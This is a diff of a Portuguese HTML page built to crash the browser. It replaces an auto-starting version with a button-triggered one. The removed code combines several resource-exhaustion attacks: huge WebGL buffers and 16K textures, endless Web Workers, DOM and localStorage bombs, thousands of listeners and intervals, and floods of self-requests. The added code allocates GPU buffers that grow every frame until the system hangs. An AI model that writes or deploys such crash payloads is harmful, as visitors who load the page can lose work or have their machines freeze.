@@ -2,393 +2,389 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>Crash Instantâneo WebGL</title>
+    <title>WebGL Crash Instantâneo</title>
     <style>
-        body { 
-            margin: 0; 
-            background: #000; 
-            color: #fff; 
-            font-family: Arial, sans-serif; 
-            text-align: center; 
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #fff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .warning {
+            background: rgba(255, 0, 0, 0.2);
+            border: 2px solid #ff0000;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px;
+            max-width: 800px;
+            text-align: center;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+            z-index: 10;
+            position: relative;
+        }
+        
+        .warning h1 {
+            color: #ff5555;
+            margin-bottom: 15px;
+            font-size: 28px;
+        }
+        
+        .warning p {
+            margin: 10px 0;
+            line-height: 1.5;
+        }
+        
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            padding: 20px;
+        }
+        
+        canvas {
+            border: 2px solid #ff5555;
+            border-radius: 10px;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.7);
+            margin: 20px 0;
+            background: #000;
+        }
+        
+        .controls {
+            display: flex;
+            gap: 20px;
+            margin: 20px 0;
+        }
+        
+        button {
+            background: linear-gradient(to bottom, #ff3333, #cc0000);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(255, 0, 0, 0.4);
+        }
+        
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(255, 0, 0, 0.6);
+        }
+        
+        button:active {
+            transform: translateY(1px);
+        }
+        
+        #status {
+            font-size: 22px;
+            margin: 20px 0;
+            text-align: center;
+            min-height: 30px;
+            color: #ff5555;
+            font-weight: bold;
+            text-shadow: 0 0 10px rgba(255, 0, 0, 0.7);
+        }
+        
+        .info {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 10px;
+            padding: 15px;
+            margin: 10px;
+            max-width: 800px;
+            text-align: center;
+        }
+        
+        .particles {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1;
+        }
+        
+        .glitch {
+            position: relative;
+            animation: glitch 5s infinite;
+        }
+        
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(-2px, -2px); }
+            60% { transform: translate(2px, 2px); }
+            80% { transform: translate(2px, -2px); }
+            100% { transform: translate(0); }
+        }
+        
+        .counter {
+            font-size: 24px;
+            margin: 10px;
+            color: #ff5555;
+            font-weight: bold;
+        }
+        
+        .progress {
+            width: 100%;
+            max-width: 500px;
+            height: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            margin: 20px 0;
             overflow: hidden;
         }
-        #warning { 
-            margin: 15px; 
-            color: red; 
-            font-weight: bold; 
-            font-size: 24px;
-            text-shadow: 0 0 10px #f00;
-            animation: blink 0.5s infinite alternate;
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(to right, #ff3333, #ff0000);
+            width: 0%;
+            transition: width 0.5s ease;
+            border-radius: 10px;
         }
-        @keyframes blink {
+        
+        .flashing {
+            animation: flash 0.5s infinite alternate;
+        }
+        
+        @keyframes flash {
             from { opacity: 1; }
             to { opacity: 0.3; }
-        }
-        #status { 
-            margin: 10px; 
-            font-size: 18px; 
-            color: #ff4444;
-        }
-        canvas { 
-            border: 2px solid #f00; 
-            display: block; 
-            margin: 10px auto; 
-            background: #111;
-        }
-        .countdown {
-            font-size: 48px;
-            color: #ff0000;
-            margin: 20px;
-            text-shadow: 0 0 15px #f00;
         }
     </style>
 </head>
 <body>
-    <div id="warning">⚠️ ALERTA CRÍTICO: CRASH INICIANDO ⚠️</div>
-    <div id="status">Preparando sistemas de crash...</div>
-    <div class="countdown" id="countdown">3</div>
-    <canvas id="gl-canvas" width="800" height="600"></canvas>
+    <div class="particles" id="particles"></div>
+    
+    <div class="warning glitch">
+        <h1>⚠️ PERIGO EXTREMO ⚠️</h1>
+        <p>Este código irá travar seu navegador instantaneamente!</p>
+        <p>Use apenas em máquina virtual ou hardware descartável.</p>
+        <p>O sistema começará a crashar assim que você clicar no botão.</p>
+    </div>
+    
+    <div class="container">
+        <div class="info">
+            <h2>WebGL Crash Progressivo</h2>
+            <p>Este código cria buffers WebGL que duplicam infinitamente até travar o sistema.</p>
+        </div>
+        
+        <canvas id="gl-canvas" width="800" height="600"></canvas>
+        
+        <div class="counter">
+            Buffers criados: <span id="bufferCount">0</span>
+        </div>
+        
+        <div class="progress">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        
+        <div id="status">Clique no botão para iniciar o crash...</div>
+        
+        <div class="controls">
+            <button id="crashButton">INICIAR CRASH INSTANTÂNEO</button>
+            <button id="autoButton" style="background:linear-gradient(to bottom, #3333ff, #0000cc)">CRASH AUTOMÁTICO (5s)</button>
+        </div>
+        
+        <div class="info">
+            <p>O crash usará WebGL para criar buffers de vértices que duplicam a cada frame.</p>
+            <p>Isso consumirá rapidamente toda a memória e recursos da GPU.</p>
+        </div>
+    </div>
 
     <script>
+        // Criar partículas de fundo
+        function createParticles() {
+            const particlesContainer = document.getElementById('particles');
+            for (let i = 0; i < 50; i++) {
+                const particle = document.createElement('div');
+                particle.style.position = 'absolute';
+                particle.style.width = Math.random() * 5 + 2 + 'px';
+                particle.style.height = particle.style.width;
+                particle.style.backgroundColor = i % 2 === 0 ? '#ff5555' : '#ff0000';
+                particle.style.borderRadius = '50%';
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.top = Math.random() * 100 + '%';
+                particle.style.opacity = Math.random() * 0.5 + 0.1;
+                particle.style.animation = `float ${Math.random() * 10 + 5}s infinite linear`;
+                
+                const keyframes = `
+                @keyframes float {
+                    0% { transform: translate(0, 0) rotate(0deg); }
+                    100% { transform: translate(${Math.random() * 100 - 50}px, ${Math.random() * 100 - 50}px) rotate(360deg); }
+                }`;
+                
+                const styleSheet = document.createElement('style');
+                styleSheet.textContent = keyframes;
+                document.head.appendChild(styleSheet);
+                
+                particlesContainer.appendChild(particle);
+            }
+        }
+        
+        createParticles();
+        
         // Inicializa WebGL
         const canvas = document.getElementById('gl-canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        const gl = canvas.getContext('webgl');
         if (!gl) {
-            document.getElementById('status').textContent = 'WebGL não suportado. Usando métodos alternativos...';
-            // Fallback para crash sem WebGL
-            crashWithoutWebGL();
-        } else {
-            // Crash com WebGL
-            initWebGLCrash();
+            document.getElementById('status').textContent = 'WebGL não suportado. Use Chrome/Firefox atualizado.';
+            throw new Error('WebGL não suportado');
         }
 
-        function initWebGLCrash() {
+        // Shaders simples
+        const vertexShaderSource = `
+            attribute vec2 a_position;
+            void main() {
+                gl_Position = vec4(a_position, 0.0, 1.0);
+                gl_PointSize = 3.0;
+            }
+        `;
+        
+        const fragmentShaderSource = `
+            precision highp float;
+            void main() {
+                gl_FragColor = vec4(1.0, 0.0, 0.0, 1.0);
+            }
+        `;
+
+        // Compila shaders
+        function createShader(gl, type, source) {
+            const shader = gl.createShader(type);
+            gl.shaderSource(shader, source);
+            gl.compileShader(shader);
+            return shader;
+        }
+
+        // Cria programa WebGL
+        const vertexShader = createShader(gl, gl.VERTEX_SHADER, vertexShaderSource);
+        const fragmentShader = createShader(gl, gl.FRAGMENT_SHADER, fragmentShaderSource);
+        const program = gl.createProgram();
+        gl.attachShader(program, vertexShader);
+        gl.attachShader(program, fragmentShader);
+        gl.linkProgram(program);
+        gl.useProgram(program);
+
+        // Estado do crash
+        let crashStarted = false;
+        let bufferCount = 0;
+        const buffers = [];
+        let multiplier = 1;
+        
+        // Elementos da UI
+        const statusElement = document.getElementById('status');
+        const bufferCountElement = document.getElementById('bufferCount');
+        const progressBar = document.getElementById('progressBar');
+        const crashButton = document.getElementById('crashButton');
+        const autoButton = document.getElementById('autoButton');
+        
+        // Função de crash WebGL
+        function crashWebGL() {
+            if (!crashStarted) return;
+            
             try {
-                // Shaders extremamente pesados
-                const vertexShaderSource = `
-                    attribute vec2 a_position;
-                    uniform vec2 u_resolution;
-                    void main() {
-                        vec2 clipSpace = (a_position / u_resolution) * 2.0 - 1.0;
-                        gl_Position = vec4(clipSpace * vec2(1, -1), 0.0, 1.0);
-                        gl_PointSize = 100.0;
-                    }
-                `;
+                // Aumenta o multiplicador a cada frame
+                multiplier *= 1.2;
                 
-                const fragmentShaderSource = `
-                    precision highp float;
-                    uniform vec4 u_color;
-                    uniform float u_time;
-                    void main() {
-                        vec2 coord = gl_FragCoord.xy;
-                        vec4 color = u_color;
-                        
-                        // Cálculos extremamente pesados
-                        for (int i = 0; i < 5000; i++) {
-                            color.r += 0.0001 * sin(coord.x * 0.01 + float(i) * 0.1 + u_time);
-                            color.g += 0.0001 * cos(coord.y * 0.01 + float(i) * 0.2 + u_time);
-                            color.b += 0.0001 * sin(coord.x * 0.02 + coord.y * 0.02 + float(i) * 0.3 + u_time);
-                        }
-                        
-                        // Mais cálculos complexos
-                        for (int j = 0; j < 1000; j++) {
-                            color.a += 0.00001 * float(j);
-                            color.rgb *= 1.0001;
-                        }
-                        
-                        gl_FragColor = color;
+                // Cria múltiplos buffers com muitos vértices
+                const newBuffersCount = Math.floor(10 * multiplier);
+                for (let i = 0; i < newBuffersCount; i++) {
+                    // Cria buffer com número crescente de vértices
+                    const vertexCount = Math.floor(100000 * multiplier);
+                    const vertices = new Float32Array(vertexCount * 2);
+                    
+                    // Preenche com coordenadas aleatórias
+                    for (let j = 0; j < vertexCount * 2; j++) {
+                        vertices[j] = Math.random() * 2 - 1;
                     }
-                `;
-
-                // Compila shaders
-                function createShader(gl, type, source) {
-                    const shader = gl.createShader(type);
-                    gl.shaderSource(shader, source);
-                    gl.compileShader(shader);
-                    return shader;
+                    
+                    // Cria e armazena o buffer
+                    const buffer = gl.createBuffer();
+                    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+                    gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW);
+                    buffers.push(buffer);
+                    bufferCount++;
+                    
+                    // Atualiza a UI
+                    bufferCountElement.textContent = bufferCount;
+                    progressBar.style.width = Math.min(100, Math.log(bufferCount) * 10) + '%';
+                    
+                    // Desenha os pontos para consumir mais recursos
+                    const positionLocation = gl.getAttribLocation(program, 'a_position');
+                    gl.enableVertexAttribArray(positionLocation);
+                    gl.vertexAttribPointer(positionLocation, 2, gl.FLOAT, false, 0, 0);
+                    gl.drawArrays(gl.POINTS, 0, vertexCount);
                 }
-
-                // Cria programa
-                const vertexShader = createShader(gl, gl.VERTEX_SHADER, vertexShaderSource);
-                const fragmentShader = createShader(gl, gl.FRAGMENT_SHADER, fragmentShaderSource);
-                const program = gl.createProgram();
-                gl.attachShader(program, vertexShader);
-                gl.attachShader(program, fragmentShader);
-                gl.linkProgram(program);
-                gl.useProgram(program);
-
-                // Atributos e uniformes
-                const positionLocation = gl.getAttribLocation(program, 'a_position');
-                const resolutionLocation = gl.getUniformLocation(program, 'u_resolution');
-                const colorLocation = gl.getUniformLocation(program, 'u_color');
-                const timeLocation = gl.getUniformLocation(program, 'u_time');
-                gl.uniform2f(resolutionLocation, canvas.width, canvas.height);
-
-                // Contagem regressiva antes do crash
-                let countdown = 3;
-                const countdownElement = document.getElementById('countdown');
-                const countdownInterval = setInterval(() => {
-                    countdown--;
-                    countdownElement.textContent = countdown;
-                    if (countdown <= 0) {
-                        clearInterval(countdownInterval);
-                        countdownElement.textContent = "CRASH!";
-                        document.getElementById('status').textContent = 'CRASH INICIADO! TRAVANDO SISTEMA...';
-                        startExtremeCrash();
-                    }
-                }, 1000);
-
-                function startExtremeCrash() {
-                    // 1. WebGL: 10 MILHÕES de pontos + loop infinito
-                    const vertexCount = 10000000;
-                    const crashVertices = new Float32Array(vertexCount * 2);
-                    for (let i = 0; i < vertexCount * 2; i += 2) {
-                        crashVertices[i] = Math.random() * canvas.width;
-                        crashVertices[i + 1] = Math.random() * canvas.height;
-                    }
-                    const crashBuffer = gl.createBuffer();
-                    gl.bindBuffer(gl.ARRAY_BUFFER, crashBuffer);
-                    gl.bufferData(gl.ARRAY_BUFFER, crashVertices, gl.STATIC_DRAW);
-
-                    // Texturas enormes (16K x 16K)
-                    const textures = [];
-                    for (let i = 0; i < 100; i++) {
-                        const texture = gl.createTexture();
-                        gl.bindTexture(gl.TEXTURE_2D, texture);
-                        const size = 16384;
-                        const data = new Uint8Array(size * size * 4);
-                        for (let j = 0; j < data.length; j++) {
-                            data[j] = Math.random() * 255;
-                        }
-                        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, size, size, 0, gl.RGBA, gl.UNSIGNED_BYTE, data);
-                        textures.push(texture);
-                    }
-
-                    // Loop WebGL extremo
-                    let frameCount = 0;
-                    function crashWebGLLoop() {
-                        frameCount++;
-                        gl.clear(gl.COLOR_BUFFER_BIT);
-                        gl.bindBuffer(gl.ARRAY_BUFFER, crashBuffer);
-                        gl.enableVertexAttribArray(positionLocation);
-                        gl.vertexAttribPointer(positionLocation, 2, gl.FLOAT, false, 0, 0);
-                        gl.uniform4f(colorLocation, Math.random(), Math.random(), Math.random(), 1);
-                        gl.uniform1f(timeLocation, frameCount * 0.01);
-                        
-                        // Desenha múltiplas vezes por frame
-                        for (let i = 0; i < 50; i++) {
-                            gl.drawArrays(gl.POINTS, 0, vertexCount);
-                        }
-                        
-                        // Alterna texturas para aumentar carga
-                        if (frameCount % 5 === 0) {
-                            const texIndex = frameCount % textures.length;
-                            gl.bindTexture(gl.TEXTURE_2D, textures[texIndex]);
-                        }
-                        
-                        requestAnimationFrame(crashWebGLLoop);
-                    }
-                    crashWebGLLoop();
-
-                    // 2. Estouro de memória MASSIVO
-                    setTimeout(() => {
-                        const memoryHogs = [];
-                        let memoryCounter = 0;
-                        function consumeMemory() {
-                            try {
-                                // Arrays gigantes de diferentes tipos
-                                memoryHogs.push(new Float64Array(5000000)); // 5 milhões de doubles
-                                memoryHogs.push(new Array(2000000).fill({data: new Array(1000)})); // Objetos complexos
-                                memoryHogs.push(new Uint32Array(10000000)); // 10 milhões de inteiros
-                                
-                                memoryCounter++;
-                                if (memoryCounter < 1000) { // Tentar criar 1000 arrays gigantes
-                                    setTimeout(consumeMemory, 10);
-                                }
-                            } catch(e) {
-                                // Continua mesmo com erros de memória
-                                setTimeout(consumeMemory, 1);
-                            }
-                        }
-                        consumeMemory();
-                    }, 100);
-
-                    // 3. Web Workers extremos para todos os núcleos
-                    function createExtremeWorker() {
-                        const workerCode = `
-                            // CPU intensivo máximo
-                            while(true) {
-                                let result = 0;
-                                // Loop extremamente pesado
-                                for(let i = 0; i < 50000000; i++) {
-                                    result += Math.sqrt(Math.sin(Math.cos(Math.tan(i))));
-                                    if (i % 1000000 === 0) {
-                                        // Aloca memória periodicamente
-                                        const arr = new Float64Array(1000000);
-                                        for (let j = 0; j < arr.length; j++) {
-                                            arr[j] = Math.random();
-                                        }
-                                    }
-                                }
-                                
-                                // Mais alocação de memória
-                                const bigArray = [];
-                                for(let k = 0; k < 1000; k++) {
-                                    bigArray.push(new Array(100000).fill(Math.random()));
-                                }
-                            }
-                        `;
-                        
-                        const blob = new Blob([workerCode], { type: 'application/javascript' });
-                        const url = URL.createObjectURL(blob);
-                        return new Worker(url);
-                    }
-
-                    // Criar múltiplos workers (até 16 para sistemas com muitos núcleos)
-                    for (let i = 0; i < 16; i++) {
-                        setTimeout(() => {
-                            try {
-                                createExtremeWorker();
-                            } catch(e) {
-                                // Ignora erros
-                            }
-                        }, i * 50);
-                    }
-
-                    // 4. Bombardeio de DOM extremo
-                    setTimeout(() => {
-                        let domCounter = 0;
-                        function bombDOM() {
-                            for (let i = 0; i < 10000; i++) {
-                                const element = document.createElement('div');
-                                element.innerHTML = '<div style="width:100px;height:100px;background:red;">'.repeat(100);
-                                element.style.position = 'absolute';
-                                element.style.left = Math.random() * window.innerWidth + 'px';
-                                element.style.top = Math.random() * window.innerHeight + 'px';
-                                document.body.appendChild(element);
-                            }
-                            domCounter++;
-                            if (domCounter < 100) { // Criar 1 milhão de elementos
-                                setTimeout(bombDOM, 10);
-                            }
-                        }
-                        bombDOM();
-                    }, 200);
-
-                    // 5. Event listeners infinitos
-                    setTimeout(() => {
-                        for (let i = 0; i < 50000; i++) {
-                            window.addEventListener('mousemove', () => {
-                                const heavyCalc = () => {
-                                    let total = 0;
-                                    for (let j = 0; j < 1000000; j++) {
-                                        total += Math.sqrt(Math.sin(j) * Math.cos(j));
-                                    }
-                                    return total;
-                                };
-                                for (let k = 0; k < 10; k++) heavyCalc();
-                            }, {once: false});
-                        }
-                    }, 300);
-
-                    // 6. Intervalos infinitos extremos
-                    for (let i = 0; i < 500; i++) {
-                        setInterval(() => {
-                            const arr = new Array(100000).fill().map(() => Math.random());
-                            // Ordenação pesada
-                            for (let j = 0; j < 10; j++) {
-                                arr.sort((a, b) => {
-                                    const calcA = Math.sin(a) * Math.cos(a);
-                                    const calcB = Math.sin(b) * Math.cos(b);
-                                    return calcA - calcB;
-                                });
-                            }
-                        }, 1);
-                    }
-
-                    // 7. Tentativas de rede massivas
-                    setTimeout(() => {
-                        setInterval(() => {
-                            for (let i = 0; i < 500; i++) {
-                                try {
-                                    fetch(window.location.href + '?crash=' + Math.random()).catch(() => {});
-                                } catch(e) {}
-                            }
-                        }, 50);
-                    }, 400);
-
-                    // 8. Sobrecarga de áudio (se suportado)
-                    try {
-                        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-                        const oscillators = [];
-                        for (let i = 0; i < 100; i++) {
-                            const oscillator = audioContext.createOscillator();
-                            oscillator.connect(audioContext.destination);
-                            oscillator.frequency.value = 100 + Math.random() * 1000;
-                            oscillator.start();
-                            oscillators.push(oscillator);
-                        }
-                    } catch(e) {}
-
-                    // 9. LocalStorage bomb
-                    setTimeout(() => {
-                        let storageCounter = 0;
-                        function bombStorage() {
-                            try {
-                                localStorage.setItem('crash_data_' + storageCounter, 'x'.repeat(1000000));
-                                storageCounter++;
-                                if (storageCounter < 100) {
-                                    setTimeout(bombStorage, 10);
-                                }
-                            } catch(e) {}
-                        }
-                        bombStorage();
-                    }, 500);
-                }
-
+                
+                // Continua o loop
+                requestAnimationFrame(crashWebGL);
             } catch (e) {
-                document.getElementById('status').textContent = 'Erro no WebGL. Usando métodos alternativos...';
-                crashWithoutWebGL();
+                statusElement.textContent = 'CRASH COMPLETO! Sistema travado.';
+                statusElement.classList.add('flashing');
             }
         }
-
-        function crashWithoutWebGL() {
-            document.getElementById('status').textContent = 'CRASH INICIADO (sem WebGL)! TRAVANDO SISTEMA...';
+        
+        // Inicia o crash
+        function startCrash() {
+            if (crashStarted) return;
             
-            // Métodos alternativos de crash
-            // 1. Estouro de memória
-            const memoryArrays = [];
-            function consumeMemory() {
-                try {
-                    memoryArrays.push(new Array(10000000).fill(0));
-                    setTimeout(consumeMemory, 1);
-                } catch(e) {
-                    setTimeout(consumeMemory, 1);
-                }
-            }
-            consumeMemory();
+            crashStarted = true;
+            statusElement.textContent = 'CRASH INICIADO! Travagando sistema...';
+            crashButton.disabled = true;
+            autoButton.disabled = true;
+            crashButton.style.background = 'linear-gradient(to bottom, #666, #333)';
+            autoButton.style.background = 'linear-gradient(to bottom, #666, #333)';
             
-            // 2. CPU intensivo
-            function maxCPU() {
-                let result = 0;
-                for (let i = 0; i < 100000000; i++) {
-                    result += Math.sqrt(Math.sin(i) * Math.cos(i));
-                }
-                setTimeout(maxCPU, 1);
-            }
-            for (let i = 0; i < 8; i++) {
-                setTimeout(maxCPU, i * 10);
-            }
-            
-            // 3. DOM bomb
-            setInterval(() => {
-                for (let i = 0; i < 1000; i++) {
-                    const div = document.createElement('div');
-                    div.innerHTML = 'x'.repeat(10000);
-                    document.body.appendChild(div);
-                }
-            }, 10);
+            // Inicia o loop de crash
+            crashWebGL();
         }
+        
+        // Configura os botões
+        crashButton.addEventListener('click', startCrash);
+        autoButton.addEventListener('click', () => {
+            statusElement.textContent = 'Crash automático iniciando em 5 segundos...';
+            setTimeout(startCrash, 5000);
+        });
+        
+        // Desenho inicial no canvas
+        function initialDraw() {
+            gl.clearColor(0.0, 0.0, 0.0, 1.0);
+            gl.clear(gl.COLOR_BUFFER_BIT);
+            
+            // Desenha um padrão inicial
+            const initialVertices = new Float32Array([
+                -0.5, -0.5, 0.5, -0.5, 0.0, 0.5
+            ]);
+            
+            const buffer = gl.createBuffer();
+            gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+            gl.bufferData(gl.ARRAY_BUFFER, initialVertices, gl.STATIC_DRAW);
+            
+            const positionLocation = gl.getAttribLocation(program, 'a_position');
+            gl.enableVertexAttribArray(positionLocation);
+            gl.vertexAttribPointer(positionLocation, 2, gl.FLOAT, false, 0, 0);
+            
+            gl.drawArrays(gl.TRIANGLES, 0, 3);
+        }
+        
+        initialDraw();
     </script>
 </body>
 </html>
